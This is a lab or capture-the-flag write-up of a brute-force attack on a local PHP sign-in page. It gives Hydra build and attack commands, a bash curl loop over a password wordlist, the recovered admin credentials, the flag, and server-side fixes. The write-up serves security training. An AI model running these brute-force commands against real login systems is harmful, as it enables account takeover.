# Brute‑force Login (signin)

**One‑liner:** The sign‑in endpoint accepts unlimited guesses with weak credentials and no throttling/lockout. Using a common wordlist, we brute‑force `admin:shadow` and get a flag.

---

## Where

* **URL:** `http://127.0.0.1:8080/index.php?page=signin`
* **Method:** `GET` with query params (also works with `POST` in many labs)
* **Params:** `username`, `password`, `Login=Login`
* **Auth:** none prior to login

**Example baseline request:**

```
GET /index.php?page=signin&username=admin&password=test&Login=Login
```

---

## How to reproduce

### A) With Hydra (deterministic and fast)

> Use only in a lab. Document the exact command and the wordlist source.

1. Build Hydra (optional; can also use distro package):

```bash
cd ~/src && git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure --disable-xhydra --prefix="$HOME/.local" && make -j"$(nproc)"
```

2. Run the attack (top‑10k passwords list):

```bash
./hydra -l admin -P ./dictionnary.txt -s 8080 -f -V 127.0.0.1 \
  http-get-form \
  "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:S=flag"
```

* `http-get-form` → module for GET form submissions.
* `S=flag` → success pattern to detect (page shows "flag" on success). Alternative: `F=WrongAnswer.gif` as failure pattern.
* Wordlist used (example): `10-million-password-list-top-10000.txt` (SecLists).

**Observed (sample output):**

```
[8080][http-get-form] host: 127.0.0.1   login: admin   password: shadow
```

### B) With a simple bash loop (slower but transparent)

```bash
BASE='http://127.0.0.1:8080/index.php?page=signin'
USER='admin'
while read -r p; do
  url="${BASE}&username=${USER}&password=${p}&Login=Login"
  r=$(curl -s "$url")
  if echo "$r" | grep -q "flag"; then
    echo "FOUND: $USER:$p"; break
  fi
  sleep 0.05
done < dictionnary.txt
```

**Final creds:** `admin : shadow`

**Flag returned:**

```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

---

## Impact

* **Credential stuffing / brute‑force:** Attacker can gain access to privileged accounts.
* **Account takeover → data exposure / admin action.**

**Severity:** High (trivial to exploit; leads to full account access).

---

## Fix (server‑side — mandatory)

1. **Rate limit & lockout:**

   * Sliding window throttling per IP and per account (e.g., 5 attempts → 1–5 min cool‑down).
   * Progressive backoff; alerting on spikes.
2. **Account lock policies:** Temporary lock after N failures; secure, user‑friendly unlock flows.
3. **Strong password policy:** Minimum length/entropy; deny top‑N common passwords; encourage passphrases; password reuse checks.
4. **MFA for privileged users:** TOTP/WebAuthn for `admin` and high‑risk actions.
5. **Monitoring & anomaly detection:** Detect credential stuffing patterns; serve 401/429 with generic messages.
6. **Hashing & storage:** Store passwords with **Argon2id**/bcrypt (unique salt, high cost). (Prevents offline cracking if DB leaks.)
7. **CSRF tokens** on login forms and proper session handling (rotation on auth).

---

## References

* OWASP Top 10 **A07:2021 – Identification and Authentication Failures**
* CWE‑307: **Improper Restriction of Excessive Authentication Attempts**
* CWE‑521: **Weak Password Requirements**
* SecLists wordlists: `Passwords/Common-Credentials/10-million-password-list-top-10000.txt`
